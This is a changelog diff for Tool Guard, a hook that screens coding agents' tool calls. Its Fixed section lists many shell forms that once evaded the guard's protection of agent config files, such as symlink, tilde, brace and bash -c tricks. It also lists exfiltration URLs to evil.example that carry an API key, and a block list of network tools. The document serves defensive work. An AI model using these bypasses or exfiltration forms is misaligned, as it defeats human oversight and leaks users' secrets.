@@ -6,6 +6,46 @@ the project adheres to [Semantic Versioning](https://semver.org/).
 
 ## [Unreleased]
 
+### Review corrections
+
+- `tg hook` accepts a `command` array of strings for `apply_patch` with the
+  example wrapper's fail-closed flags. Null or non-string array elements
+  remain malformed input.
+- Parameter aliases with different JSON escape spellings of the same string
+  now count as one value toward the alias limit.
+
+- Release publication now requires the retained harness manifest to match the
+  release source and verifier. The workflow checks source provenance without
+  the original measured binary; `make release-binding` still checks that
+  binary. The historical manifest blocks release until a new measurement.
+- The example wrapper requires one JSON object with a valid decision in the
+  expected dialect field before returning a response.
+- Native-write allow controls require a matching hook record for the expected
+  tool class before the verifier reports that the write ran through the hook.
+- `tg hook` treats null typed fields as malformed input for configured
+  fail-closed tool groups.
+- The example installer rejects repository paths that are unsafe in shell
+  commands and removes its temporary config copies on exit and on HUP, INT,
+  or TERM signals.
+
+- `tg hook` reads the requested dialect even when an earlier flag is invalid.
+  When the harness cannot be identified, early-error responses include both
+  decision formats. Missing or null tool arguments now fail closed for
+  configured tool groups. Empty argument objects remain valid.
+- Repeated identical parameter aliases no longer consume the alias limit.
+  When distinct values exceed the limit, the reason reports a lower bound
+  instead of counting sampled envelopes as values.
+
+- The retained harness run measured commit
+  `24eafd647ce3fabebe0837df540340ed31b30829` on 2026-11-10. It does not
+  verify the current source end to end. `make release-binding` checks the
+  measured binary hash and Go VCS metadata, verifier hash, and source changes
+  since the measured commit. This gate fails for the retained historical
+  manifest. A new maintainer-run measurement is required before release.
+- The harness verifier copies sign-in files with mode 0600 by default. It
+  removes credential values, including short tokens and base64 punctuation,
+  from retained evidence before writing it, and fails a run that exposes them.
+
 ### Added
 
 - Opt-in `command_classify` with the `gh_read` profile checks each control-separated
@@ -30,7 +70,13 @@ the project adheres to [Semantic Versioning](https://semver.org/).
 - `tg hook -dispatch gh_read` (opt-in, enforcement mode only) classifies a
   Bash call that protected paths and every enforcing rule allowed: a verified
   gh read allows, a validated literal `pwd` or `ls` returns no permission
-  decision so the client's permission rules apply, and everything else asks.
+  decision for Claude so the client's permission rules apply, and everything
+  else asks. Other dialects ask for validated literal `pwd` or `ls` too.
+  Dispatch checks every distinct command alias value: all must be verified
+  reads to allow. Any unverified value asks; otherwise any proven unrelated
+  value returns no decision for Claude and asks for other dialects. Missing
+  or non-string commands and truncated alias variants ask. Dispatch asks
+  obey `-escalate-as`; `deny` and invalid values return a denial.
   With `-dispatch`, every internal error denies for every tool, an audit
   write that fails denies, and a supervising parent denies when stdin and the
   evaluating child do not finish within 10 seconds in total, or the child
@@ -59,17 +105,145 @@ the project adheres to [Semantic Versioning](https://semver.org/).
   is additive; code that builds `StreamReport` with positional struct literals must switch to keyed
   fields. A trusted external checkpoint pin establishes checkpoint identity
   only; it does not authenticate deleted records.
+- Added `secret_classify` for provider and generic secret formats. It uses
+  the pinned gitleaks keywords, capture groups, entropy limits, allowlists,
+  and stopwords. It scans 65,536 bytes by default and reports truncation.
+  It does not scan paths, decode values, join variables, or redact data.
+  The shadow secrets policy now uses this condition in place of generated
+  regex branches. Its hand-written checks remain. Generic keys have a
+  separate low-severity flag rule. The policy still blocks nothing in shadow
+  mode. Core has no redaction: `tg hook` and `tg-proxy` do not store
+  the raw tool parameters in the audit record, but the record can hold
+  values taken from them, such as an amount or a protected file path quoted
+  in a decision reason.
+- An `or` condition that does not fire now returns its branches' details,
+  joined by `; `, instead of an empty string. A `secret_classify`
+  truncation report inside an `or` now reaches the rule result.
+- Go API: `domain.Condition.SecretClassify` and `domain.SecretClassify` add
+  secret-scanning configuration. Callers using positional `Condition`
+  struct literals must switch to keyed fields.
+- Two new policies, `policies/coding_agent_secret_egress.yaml` and
+  `policies/coding_agent_context_files.yaml`. Loading the whole `policies/`
+  directory now activates them; a deployment that names policy files
+  individually does not change until it adds them. `coding_agent_secret_egress`
+  denies a call carrying a value in a known API-key or token format unless the
+  URL names a host listed in its carve-out regexes. In a shell command, one
+  listed URL anywhere in the command satisfies the carve-out. It also denies
+  a `curl`, `wget`, `nc`, `ncat`, `scp`, `sftp` or `rsync` command line that
+  names a dotenv file in one of the forms listed in the policy description. It
+  matches the listed vendor formats only. It is not a secret scanner and does
+  not detect exfiltration of data that has no known shape. The host list is
+  short and must be edited for private endpoints. `coding_agent_context_files`
+  escalates a write to an agent instruction or permission file and denies a
+  write whose content carries a known key format. It is scoped by tool group,
+  so it fires for write tools the classifier names and for a path parameter
+  the hook can canonicalise. `tg hook` now recognises the Gemini CLI and
+  Antigravity write tool names and adds canonical `file_path` / `content`
+  aliases when a caller used another spelling, so the policy now sees a write to `AGENTS.md` made under those tool names
+  and escalates it. What each harness does with an escalation is in
+  `docs/support-matrix.md`. A write tool or path
+  parameter that is neither known nor canonicalisable is still not covered;
+  `-unknown-tools-deny` is the blunt control. Neither policy is default
+  protection against exfiltration. See the limits in each file's description.
+  Activation is per policy directory, not per rule: a
+  deployment that loads the shipped `policies/` directory starts enforcing
+  both the moment it upgrades. Conformance cases cover both, including the
+  host-carve-out pair, the pre-signed S3 case and the host-boundary escapes
+  listed under Fixed.
 
+- `examples/coding-agent-guard/install.sh` now wires `tg hook` into each
+  harness through one wrapper script per harness: `hooks/claude-code-hook.sh`,
+  `hooks/codex-hook.sh` and `hooks/antigravity-cli-hook.sh`. Each wrapper
+  calls `hooks/guard-hook.sh` with the harness name. The hook loads the five
+  policies in `examples/coding-agent-guard/policies/`, writes a dated audit
+  log, and denies the writes it can read to its own files and to three harness
+  config files: `~/.claude/settings.json`, `~/.codex/hooks.json` and
+  `~/.gemini/config/hooks.json`. The example README lists the shell forms it
+  reads and the ones it does not. It does not protect other files a harness
+  reads its configuration from, such as a project `.claude/settings.json` or
+  `.claude/settings.local.json`, a project `.codex/hooks.json`,
+  `.codex/config.toml`, `~/.gemini/settings.json` or a workspace
+  `.agents/hooks.json`. Add those paths with `install.sh --protect PATH`. When
+  `tg` is
+  missing or prints no decision, the hook answers with a denial. The older
+  adapters, which called `tg evaluate` with one shell-scoped `policy.yaml`,
+  are in `hooks/legacy/` and are not installed. Two shim scripts are at the old adapter paths, so a config file written by
+  an earlier `install.sh` does not name a missing file. A shim uses the one
+  old policy file and turns the built-in protected paths off. It adds no
+  coverage to an old install: the old Claude Code config matches the `Bash`
+  tool only, the old Antigravity CLI config matches `run_command` only, and
+  Codex CLI 0.166.0 rejects the old Codex `hooks.json` layout
+  (`unknown field PreToolUse`) and loads no hook from it. That rejection was
+  seen in one interactive start on 2026-11-10. Run `install.sh` again to move
+  to the wrappers. `install.sh codex` now removes its old top-level
+  `PreToolUse` entry (`TestInstallerUpgradesAnOldCodexHooksFile`). When that
+  key holds an entry from another tool, the installer stops with exit code 1
+  and does not change the file
+  (`TestInstallerRefusesAForeignTopLevelCodexEntry`). `install.sh --protect PATH`
+  takes an absolute path and can be repeated. The installer writes the paths
+  to `~/.tool-guard/protect-paths`, one per line.
+- `examples/coding-agent-guard/verify-harnesses.sh` runs the wrappers, config
+  templates and policies of the example against the installed harnesses. It decides each result from whether a file
+  exists, not from the model's wording. It writes one `manifest.json` with the commit, the hash of the
+  `tg` binary, the hash of the wrapper, config and policy files and one record per stage. The
+  historical manifest is `docs/evidence/harness-manifest.json`, and a
+  test renders the stage table in `docs/support-matrix.md` from it. By default,
+  the script copies sign-in files into a private scratch directory outside the repository,
+  with file mode 0600. Harness writes to these copies leave the original files
+  unchanged. The script removes that directory when it exits. A run that was
+  killed leaves it until the next run. It filters session
+  identifiers, e-mail addresses and home paths out of the output it keeps.
+  `TG_VERIFY_REPEAT` sends every stage more than once, and the manifest holds
+  the count of every outcome. `make verify-harnesses` is the release run: it
+  sends every stage three times, refuses a dirty working tree and fails when
+  one of the three harnesses is not installed.
+- Claim-integrity tests. `cmd/tg/support_claims_test.go` now checks the
+  support matrix in both directions: every `verified` row must be backed by a
+  case labelled as a real-install capture at each version the row names, the
+  row must list the tools captured at each version, and every capture must
+  appear in a row. It scans `README.md`, `CHANGELOG.md`, `docs/*.md`, example
+  READMEs and the installer's own output for claims about the harness names
+  the matrix lists. `docs/support-matrix.md` states what the scan does not
+  catch.
+  `TestHookHonoursExplicitDialectFlags` covers `-dialect` override, which was
+  previously untested.
+- `tg hook -escalate-as deny` returns a policy escalation as a denial. The
+  default, `ask`, is unchanged. The Codex wrapper of the example sets `deny`.
+- `tg hook -fail-closed-groups` takes a comma-separated list of tool groups
+  (`shell`, `filesystem_writes`, `filesystem`, `network_egress`). When the
+  hook cannot evaluate a call, it denies the call if the tool is in a listed
+  group. A tool name the hook does not know is in the group `shell`.
+
+- `tg hook` speaks more than one harness dialect. `-dialect auto|claude|antigravity`
+  selects the input shape and the output contract; `auto` reads the input.
+  Antigravity CLI 1.5.3 sends a `toolCall` envelope with PascalCase argument
+  names and reads a top-level `{"decision","reason"}` object. The tool names and parameter names listed per harness in
+  `docs/support-matrix.md` come from payloads captured from real installs on
+  2026-11-09 and 2026-11-10. Every other name the hook puts in a group,
+  including the Gemini CLI names, comes from vendor documentation. No payload
+  with those names was captured.
+- A hook-level conformance corpus, `testdata/hookconformance/`, replayed by
+  `TestHookConformance` through the real hook path: stdin parsing, dialect
+  decoding, tool grouping, parameter canonicalisation, protected paths,
+  policy evaluation and decision serialisation. Cases record their harness,
+  version and capture provenance, and
+  `TestHookConformanceRealCaptureProvenance` rejects a case that claims
+  real-install provenance without naming them.
+- `docs/support-matrix.md` is the single source for a harness support claim.
+  `TestSupportMatrixMatchesCorpus` fails if it disagrees with the corpus, and
+  `TestDocsHarnessClaimsAreVerified` fails if `README.md` or `docs/*.md`
+  describes a harness as gated or supported without a verified row.
 ### Changed
 
-- Tool Guard now requires Go 1.26.0 and sets the preferred toolchain to Go 1.26.10,
-  which fixes [GO-2026-6809](https://pkg.go.dev/vuln/GO-2026-6809) in the standard
+- Tool Guard now requires Go 1.26.0 and sets the preferred toolchain to Go 1.26.11,
+  which fixes [GO-2026-6809](https://pkg.go.dev/vuln/GO-2026-6809) and
+  [GO-2026-6859](https://pkg.go.dev/vuln/GO-2026-6859) (net/http) in the standard
   library. Tool Guard also includes the golang.org/x/sys v0.49.0 update from PR #51.
 - Three existing structural-validation messages now list `command_classify`: empty
   conditions, multiple populated forms and classifiers beneath `not`.
 - CI pins govulncheck to v1.9.0 instead of `@latest`, and a new weekly
   workflow scans `main` for newly published Go advisories.
-- The policy-protection workflow builds with Go 1.26.10, matching the other
+- The policy-protection workflow builds with Go 1.26.11, matching the other
   workflows (it was still on 1.25.11).
 - The Kubernetes example in `docs/integration.md` uses image tag `0.8.1`.
   The old `v0.2.0` tag does not match the published tag format, which has
@@ -79,6 +253,353 @@ the project adheres to [Semantic Versioning](https://semver.org/).
   releases also check the actual upload archives against those digests.
   See [the rebuild procedure](docs/reproducible-builds.md) to compare an
   independent rebuild with published checksums.
+
+### Fixed
+
+- Windows protected-path checks now use `HOME` for POSIX shell paths and
+  also check native Windows path separators. Shell checks remain enabled
+  on Windows.
+- The protected-path check missed a shell path written with `~`.
+  `echo x > ~/.claude/settings.json` was allowed, while the same path written
+  in full or with `$HOME` was denied. A leading `~` or `~/` is now checked
+  under the home directory. Another tilde form, such as `~user/x`, is denied
+  when it is a redirect target or an argument of a mutating command. The
+  command that `sh`, `bash`, `zsh`, `dash` or `ksh` runs with `-c` is now
+  checked, also when `-c` is part of an option group such as `-lc` or `-ce`
+  (`TestExampleHookDeniesTildeWriteToHarnessConfig`, and
+  `pkg/engine/protect_tilde_test.go`). A variable of the outer command stays
+  unresolved inside the quotes of that inner command, so
+  `bash -c "rm '$HOME/.claude/settings.json'"` is denied. `cp`, `mv`, `ln`
+  and `install` are checked for a directory and a file name that together
+  make a protected path, such as `cp settings.json ~/.claude/`. `rm`, `mv`,
+  `rmdir`, `ln`, `chmod`, `chown` and `chgrp` are denied on a directory above
+  a protected path, such as `mv ~/.claude ~/.claude-old`
+  (`TestExampleHookDeniesDirectoryAndOptionForms`, and
+  `pkg/engine/protect_review4_test.go`).
+  The check now also reads a command after a shell keyword such as `if`,
+  `then`, `do`, `{` or `!`, and after a wrapper such as `env`, `sudo`, `exec`,
+  `command`, `nohup` or `timeout`. It expands a brace list such as
+  `settings.{json,x}`, matches a file name pattern with `*`, `?` or `[`,
+  reads `sed -Ei` and `sed --in-place` as `sed -i`, and denies a directory
+  copied to a place above a protected path, such as `cp -r x/.claude ~/`.
+  Inside a `-c` command, a program name that comes from a variable is denied.
+  A shell that reads its commands from standard input is denied when a word
+  of the whole command names a protected path. A relative path after
+  `cd DIR` or `pushd DIR` in the same command is checked under `DIR`, so
+  `cd ~/.claude && rm settings.json` is denied. `DIR` also counts when it is
+  a protected directory or a directory inside one, so
+  `cd ~/.tool-guard && echo x > protect-paths` is denied
+  (`pkg/engine/protect_review6_test.go`). More than 8 levels of nested
+  command substitution are denied
+  (`TestExampleHookDeniesReview5Forms`, and
+  `pkg/engine/protect_review5_test.go`).
+  A sixth review found more commands that the check allowed and that
+  changed a protected file. The check now has a second rule that does not
+  depend on the form of the command. A command whose text names a protected
+  path is denied unless every program in it is in a fixed list of read-only
+  programs such as `cat`, `grep` and `jq`, with no variable assignment and
+  no wrapper such as `env` before the program name. So
+  `python3 edit.py ~/.claude/settings.json`, `unlink`, `trap`, `env -S`,
+  `fish -c` and a program name that comes from a variable are denied when
+  the text names the path. The name counts in quotes, with `$HOME`, with
+  `\xHH` escapes, as a brace list, as a file name pattern, and as a relative
+  path under a directory the command also names. With such a name the check
+  also denies a comment, a here-document, `${...}`, `$((...))` and `case`,
+  which it does not read as bash does
+  (`TestExampleHookDeniesReview6Forms`, and
+  `pkg/engine/protect_review6_test.go`).
+  The check still does not see a write when the command text does not name
+  the path and the write is not a known form: a program outside the lists
+  gets the path from a variable other than `HOME`, from the output of
+  another command, from a file or from its input, reaches the file through a
+  hard link or through a symbolic link that a program other than `ln` makes
+  in the same command, goes to a directory that the command text does not
+  name (`cd $DIR`), or changes a whole directory above the path, as in
+  `find ~/.claude -delete`. A script that a shell runs from a file is not
+  read. That list is not complete.
+- Protected paths are compared without letter case on macOS and Windows, and
+  on another system where the hook finds that the directory of the protected
+  path ignores letter case. Before, a path written in another case, as in
+  `echo x > ~/.CLAUDE/settings.json`, was not seen as the protected file
+  (`pkg/engine/protect_case_test.go`). The path conditions of a policy
+  (`path_classify`, `write_classify`) still compare letters exactly.
+- A word that starts with `~+`, `~-` or `~NAME` did not count as the name
+  of a protected path. So `cd ~/.claude && curl -so ~+/settings.json URL`
+  was allowed, because `curl` is not one of the known writing commands. Such
+  a word now counts as the name of a protected path, and the command is
+  denied unless every program in it is read-only
+  (`pkg/engine/protect_case_test.go`).
+- A path with `..` after a symbolic link named a protected file and was
+  allowed, for a write tool and for a shell command. With `/var/run` a link
+  to `/run`, the text `/var/run/../etc/x` was compared as `/var/etc/x`, and
+  the file is `/etc/x`. The check now follows the link before `..`. A shell
+  word that holds `/proc/NAME/cwd` counts as the name of a protected path,
+  and a redirection to such a word is denied. The same is true for a word
+  that holds `/dev/fd/N/` or `/proc/NAME/fd/N/` before a file name
+  (`pkg/engine/protect_case_test.go`, `pkg/engine/protect_workdir_test.go`).
+- A relative path was read under the directory of the hook process. It is
+  now read under the working directory in the call (`cwd` or `workdir`), and
+  after `cd DIR` or `pushd DIR` under `DIR`, also when the path holds `..`.
+  Before, `cd ~/proj && echo x > ../.claude/settings.json` was allowed
+  (`pkg/engine/protect_workdir_test.go`,
+  `TestHookReadsTheWorkDirectoryOfThePayload`).
+- A file name pattern that matches a symbolic link to a protected directory
+  now counts. A link that `ln` makes in the same command does not exist when
+  the check runs. A command that makes a link to a protected path or to a
+  directory above one, and also runs a program that is not read-only or writes
+  with a redirection, is now denied, as in `ln -s ~/.claude l && echo x >
+  l/settings.json`. The same is true for an `ln` in a text that the command
+  runs or can run: the argument of `bash -c`, the words of `eval`, a command
+  substitution, a quoted word, and the words after `echo` or `printf`. It is
+  also true for an `ln` after `busybox`, after `xargs`, and after a program
+  that is not read-only, as in `flock FILE ln -s ~/.claude l && echo x > l/settings.json`. A link to
+  `/dev/fd` or to a path under `/proc` counts as a link to a protected path. A link that `ln` makes with a word from a variable or from a command substitution counts in the same way, as in `c="ln -s $HOME l"; $c`, because the hook cannot read the target.
+  The hook also denies a command that makes a link with `ln`, holds `..` after
+  the name of the link, and runs a program that is not read-only or writes
+  with a redirection, as in `ln -s ~/proj l && echo x >
+  l/../.claude/settings.json`. The same is true when one word holds the name
+  of the link and another word holds `..`, as in `cd l/sub && echo x >
+  ../../f`. The hook also denies such a command when no other program writes
+  and the command runs `ln` two times or more, as in `ln -s ~/proj l && ln -sf
+  f l/../.claude/settings.json`. The hook also denies a harmless command of
+  this form, as in `ln -s dist public && cd public/assets && cp ../logo.png
+  .`. A text after `echo`, `printf`, `git commit` or `git tag` does not count
+  when the command has no pipe, no input redirection, no `$`, no backtick, and
+  names no shell, `eval`, `source` or `.`. The hook does not see an `ln` that
+  runs under another name, such as an alias or a copy of the program. It also does not see an `ln` that the command builds from parts: from more than one variable, as in `x=ln; y=-s; z=$HOME; $x $y $z l`, with a separator other than a space (`IFS=,`), with a default value (`${x:-ln -s $HOME l}`), with `printf -v`, or with a change of the text of a variable (`${c//X/}`)
+  (`pkg/engine/protect_workdir_test.go`).
+- A brace list that makes more than 64 words was not expanded and was not
+  read, so `python3 w.py ~/.claude/settings.{json,{1..70}}` was allowed. Such
+  a list now counts as the name of a protected path when one of its words
+  can be the path. When the comma lists of one word make more than 4096
+  words, the word counts as the name of a protected path. A list that holds
+  a brace group of one word was not expanded, so
+  `python3 w.py ~/.claude/settings.{json,{b}}` was allowed. Such a list is
+  now read. A word that holds `/proc/NAME/root`, and the word `nocaseglob`,
+  count as the name of a protected path
+  (`pkg/engine/protect_workdir_test.go`).
+- The protected-path rules for shell commands did not run for a tool name
+  that `tg hook` does not know, though such a tool is in the group `shell`.
+  They now run for such a tool and deny the call when the command text names
+  a protected path. They run in full for the shell tool names `exec_command`,
+  `shell_command`, `local_shell`, `unified_exec` and `container.exec`
+  (`pkg/engine/protect_workdir_test.go`).
+- A tool input that is not a JSON object, or a command that is not a string,
+  was evaluated as a call with no parameters and allowed. `tg hook` now
+  denies such a call when the tool or its group is listed in a fail-closed
+  flag, for `command` and each of its aliases in any letter case, and writes
+  the denial to the audit log (`TestHookDeniesAToolInputItCannotRead`,
+  `TestHookDeniesAPayloadWithTwoToolCalls`).
+- A payload with a `toolCall` object and also `tool_name` or `tool_input`
+  names two calls. `tg hook` evaluated one of them. It now handles such a
+  payload as one it cannot read
+  (`TestHookDeniesAPayloadWithTwoToolCalls`).
+- The protected-path check of one call has a limit of 10 seconds, and a
+  check that does not end in that time denies the call. Before, a command
+  with some thousands of words could keep the hook busy for longer than the
+  hook timeout of the harness (`pkg/engine/protect_workdir_test.go`).
+- A command with a carriage return does not count as read-only. bash reads
+  the carriage return as a character of a word, and the check ended a
+  command there (`pkg/engine/protect_case_test.go`).
+- `sort` and `uniq` count as read-only programs in the name rule when their
+  words cannot name an output file: `sort` with no word that starts with
+  `--` and no option that holds `o` or `T`, `uniq` with at most one file
+  name and no `--`. Neither counts when one of its words holds `{`, `*`,
+  `?` or `[`. So `ls ~/.claude/* | sort` is allowed and
+  `uniq ~/.claude/*` is denied (`pkg/engine/protect_case_test.go`).
+- `install.sh --uninstall` printed a raw shell error when it could not write
+  a config file that has a backup. It now names the file, keeps the backup,
+  goes on with the other agents and ends with exit code 1
+  (`TestUninstallReportsAConfigFileItCannotWrite`). It does the same when
+  it restored the file and cannot remove the backup
+  (`TestUninstallGoesOnWhenACopyCannotBeRemoved`). Without a backup, a
+  config file that it could not edit gave exit code 0. That now gives exit
+  code 1 (`TestUninstallWithoutACopyFailsOnAFileItCannotEdit`).
+- `install.sh` printed its success lines and exited 0 when `jq` could not
+  edit a config file, for example a file that is not valid JSON or a
+  `PreToolUse` entry without a `hooks` array. The config file then held no
+  hook. The installer now stops with exit code 1, also when the result is
+  not one JSON object, and an entry without `hooks` no longer makes `jq` fail
+  (`TestInstallerFailsWhenJqCannotEdit`). A config file of 0 bytes is treated
+  as `{}` (`TestInstallerHandlesAnEmptyConfigFile`). The installer writes into
+  the config file in place, so the file mode stays and a symbolic link stays
+  a link, also after `--uninstall` (`TestInstallerKeepsModeAndSymlink`,
+  `TestUninstallKeepsASymlink`). It checks every config file you named before
+  it changes the first one, so a run that stops changes no config file and
+  leaves no backup (`TestInstallerChecksEveryTargetBeforeItWrites`,
+  `TestInstallerFailedRunLeavesNoBackup`). It also checks that it can write
+  to the directory of each file, and it reports a symbolic link to a file
+  that does not exist (`TestInstallerChecksTheDirectoryBeforeItWrites`,
+  `TestInstallerReportsALinkToNothingAndADirectory`). `--uninstall` without
+  a backup deleted the config file. It now removes the installer's own entry
+  and keeps the rest of the file (`TestUninstallWithoutBackupKeepsTheFile`).
+  `install.sh claude` stops when
+  `settings.json` sets `disableAllHooks` to `true`
+  (`TestInstallerRefusesDisableAllHooks`).
+  It also uses `CLAUDE_CONFIG_DIR` and `CODEX_HOME` when they are set
+  (`TestInstallerUsesConfigDirVariables`); before, it wrote to `~/.claude`
+  and `~/.codex` in every case.
+- `coding_agent_secret_egress` could be escaped by abusing the host boundary.
+  `https://api.openai.com:443@evil.example/?k=<key>` satisfied the carve-out
+  because its terminator accepted a colon, so the hook allowed the call while
+  a denial was expected. The same URL without the port was already denied.
+  In a shell command,
+  `https://api.openai.com.evil.example/` slipped through the command-field
+  word boundary. The carve-out now requires the listed name to be the whole
+  authority, optionally followed by `:port` and then `/`, `?`, `#`, whitespace
+  or end. Three conformance cases pin the variants, and one pins the
+  legitimate `curl https://api.openai.com -H "Authorization: Bearer <key>"`
+  call so the fix cannot break the case the carve-out exists for.
+- `coding_agent_secret_egress` denied local handling of a key.
+  `export OPENAI_API_KEY=<key>` and `grep -r <key> .` were both reported as
+  "Egress blocked" although nothing reached the network. A
+  `parameters.command` match now requires a network client in the same command;
+  denial of local secret handling made the rule look broken and pushed operators
+  to disable it.
+- The shipped example wired an unverified path. `config/claude-code.settings
+  .json`, `config/codex.hooks.json`, `config/antigravity.hooks.json` and
+  `install.sh` pointed at the legacy `tg evaluate` adapters, so following the
+  README produced a guard whose behaviour had never been measured end to end,
+  while the README claimed real-install verification. The configs now install
+  the wrapper scripts in `hooks/`, and `cmd/tg/example_hooks_test.go` runs
+  payloads through the shipped configs and scripts.
+  `TestInstallerWritesWhatTheTemplatesHold` compares what `install.sh` writes
+  with the templates.
+- `verify-harnesses.sh` could report success without protecting anything. It
+  counted no failures when a probe never reached the reporter, exited 0
+  regardless of failures, left probes labelled "expected" whatever happened, and
+  copied live Claude and Codex sign-in files into the run directory where they
+  persisted after the run. Probes now feed the reporter, the script exits
+  non-zero on any FAIL, and the script overwrites and removes sign-in material when it exits.
+  Overwriting does not guarantee erasure on a copy-on-write file system or on
+  flash storage. Two early
+  PASSes were false: the scratch config had no sign-in, so Claude Code and
+  Codex never dispatched the hook at all; the script now fails when no hook call
+  was recorded. For Antigravity the configuration without
+  `--dangerously-skip-permissions` is reported as a measurement, not as a pass:
+  in the release run on 1.5.4 it ran no call at all, calls the hook allowed
+  included, so a blocked call there does not show a guard decision.
+- Documentation about Antigravity escalation was wrong in both directions. An earlier entry
+  claimed an escalated call is refused without `--dangerously-skip-permissions`
+  with no evidence; a single re-measurement then withdrew the claim entirely,
+  because that run's allowed control was broken. Four local runs on 1.5.3 on 2026-11-09 give the
+  current statement. They ran from an uncommitted tree, and their records are
+  not in the repository. In each, the hook answered `force_ask` to a `write_file`
+  call for `AGENTS.md`; the context-files policy made that decision. With the
+  flag the call ran in 4 of 4 runs, so escalation is not enforceable there.
+  Without the flag the escalated call did not run in 4 of 4 runs, and the
+  control that the hook allowed wrote its file in 3 of those 4, so the
+  enforcement is attributable in three runs. In the fourth run the harness
+  performed no write at all, so that run shows nothing about enforcement. Those four runs used a hook that
+  `verify-harnesses.sh` set up for the test, not the shipped wrappers. The stage table in `docs/support-matrix.md` holds
+  the counts of the release run, which sends every stage three times through the shipped wrappers.
+- `tg hook` gave different answers for identical input when one parameter was
+  named two ways. Writing `AGENTS.md` through an envelope that carried both
+  `Path=plain.txt` and `Filename=AGENTS.md` produced two different
+  canonicalisations across identical calls, because the alias scan ranged over
+  a Go map. A guard that answers differently for the same
+  bytes is not testable, and choosing by priority would have let a protected
+  path ride in under an unexamined alias. Every distinct value is now placed on
+  a canonical key in sorted key order, and the hook evaluates the call once
+  more for each distinct path, content and command value and returns the most
+  restrictive decision. Placing the values was not enough on its own: the
+  rules read `command` and `content` only, so a second command or content
+  value was allowed before the per-value evaluation.
+  The hook evaluates at most 16 extra values. A call with more is escalated,
+  and `-escalate-as deny` turns that escalation into a denial
+  (`TestHookEscalatesAboveTheVariantLimit`).
+  The tests are in `hook_alias_determinism_test.go` and
+  `hook_alias_variants_test.go`, with the corpus case
+  `agy_write_two_alias_paths`.
+- Antigravity escalation is now returned as `force_ask`. This changes the
+  value the hook emits. It does not make an escalation stop a call. In the release run on
+  Antigravity CLI 1.5.4, started with `--dangerously-skip-permissions` in
+  headless print mode, a `run_command` call ran after the hook answered `ask`
+  in 3 of 3 runs and after it answered `force_ask` in 3 of 3 runs. That flag
+  approves permission requests. On 1.5.3 without the flag, in four local runs whose records are not in the
+  repository, the
+  harness refused a `write_file` call that the hook answered `force_ask` to
+  ("a tool required the `write_file` permission that headless mode cannot
+  prompt for, so it was auto-denied"). No retained record shows what either
+  version does with `ask` without the flag. `tg hook` now maps an escalation
+  to `force_ask`, the stricter of the two values, in the Antigravity dialect.
+  `-antigravity-escalation ask` restores `ask`, and the case
+  `agy_write_context_file_ask_override` pins what that emits. An operator who
+  runs Antigravity with `--dangerously-skip-permissions` gets deny protection
+  and no escalation protection unless `TG_ESCALATE_AS=deny` is set.
+  `verify-harnesses.sh` measures both configurations each time a maintainer
+  runs it.
+- Codex CLI 0.166.0 called `apply_patch` in the release run. An
+  `apply_patch` call has no path parameter: the patch text names the files.
+  In that run `coding_agent_writes` denied every such call, also for a new
+  file in the working tree that no rule protects.
+  `tg hook` now reads the files from the patch text, from the lines
+  `*** Add File:`, `*** Update File:`, `*** Delete File:` and `*** Move to:`.
+  It evaluates the call one time for each file, with the file as the path
+  and the added lines of the patch as the content, and the strictest decision
+  is the result. The protected-path check reads the same files. A relative
+  path is placed under the working directory that the harness reports.
+  A call that names more than 64 files is denied. A call whose text names no
+  file is evaluated as before, so `coding_agent_writes` denies it. The corpus
+  cases `codex0_166_0_apply_patch_new_file_allowed`,
+  `codex_apply_patch_system_path_denied`,
+  `codex_apply_patch_protected_path_denied`,
+  `codex_apply_patch_move_to_protected_denied`,
+  `codex_apply_patch_second_file_protected_denied` and
+  `codex_apply_patch_private_key_denied` pin this.
+  No harness run has measured the new reading: the stage table in
+  `docs/support-matrix.md` is from the run before this change.
+- The config templates in `examples/coding-agent-guard/config/` carry a
+  `_comment` key. Codex CLI 0.166.0 rejects a `hooks.json` that has it: on
+  start it warns `unknown field _comment` and loads no hook. Observed once on
+  2026-11-10 in an interactive start. `install.sh codex` does not write the
+  key. A hand copy of `codex.hooks.json` must delete it. The example README
+  says so, and `TestCodexTemplateCommentIsDocumented` fails if it stops.
+  The template itself is unchanged in 0.9.0.
+- `examples/coding-agent-guard/install.sh codex` wrote a top-level
+  `PreToolUse` key into `~/.codex/hooks.json`. Codex CLI 0.166.0 reads
+  `{"hooks":{"PreToolUse":[…]}}`, so the hook it installed never ran. The
+  example config and the installer now write the shape the CLI reads, and the
+  trust requirement is documented: an untrusted Codex hook does not run at
+  all, and `codex exec` prints nothing about it.
+- `tg hook` no longer defaults a payload with no usable `tool_name` to a Bash
+  call. Such a payload is now unattributable, the same as malformed input: it
+  fails closed when any fail-closed mode is engaged and fails open otherwise.
+  Previously a payload in another harness's hook shape was evaluated as if it
+  were a shell command. That gave an identity to a call the hook could not
+  see. `TestHookUnattributablePayloadFailsClosed`.
+- A command-line flag parse error can no longer disarm fail-closed. Go stops
+  parsing at the first unrecognised flag, so `-nope -fail-closed-tools bash`
+  left the hook failing open on an unparseable tool call while
+  `-fail-closed-tools bash` alone denied it. On a parse error the raw argument
+  list is now scanned for a fail-closed flag. `TestHookFlagParseErrorHonoursLaterFailClosedFlag`.
+- `-protect-path` now applies to `PowerShell` and `pwsh` tool calls. `echo x >
+  <protected path>` was denied as a Bash tool call and allowed as a PowerShell
+  tool call. PowerShell cmdlets (`Set-Content`, `Out-File`, `Remove-Item`) are
+  still not parsed as writes. For those calls at a protected path the test
+  accepts an escalation or a denial, so PowerShell path protection is not
+  complete.
+  `TestHookPowerShellProtectedPath`.
+- `tg hook` classifies the Gemini CLI and Antigravity write and read tool
+  names into the right tool groups instead of the `shell` default, and adds
+  canonical `file_path` / `content` parameters when the caller named them
+  differently (`TargetFile`, `target_file`, `filePath`). A tool-group-scoped
+  policy such as `coding-agent-context-files` previously never saw those
+  writes at all. `TestHookHarnessWriteToolNamesReachContextFilePolicy`,
+  `TestHookHarnessPathParameterAliasesReachContextFilePolicy`.
+- `tg protect` now includes `powershell` in the generated
+  `-fail-closed-tools` list, matching the documented claim that consequential
+  tools fail closed.
+
+- `http_classify` no longer copies the raw URL into rule details when it
+  fails closed on an unparseable or scheme-less URL. It reports the URL's
+  length instead (`pkg/engine/http_classify.go`). Rule details are written
+  to the audit log, and a URL can carry a credential in its query string.
+  Upgrading needs no configuration change. Records written by earlier
+  versions keep the URL in `rule_results[].details` and
+  `applied_rule_results[].details`; review those logs if an agent may have
+  sent a credential in a URL. A script that read the URL from this detail
+  text no longer finds it there.
 
 ## [0.8.1] — 2026-10-17
 
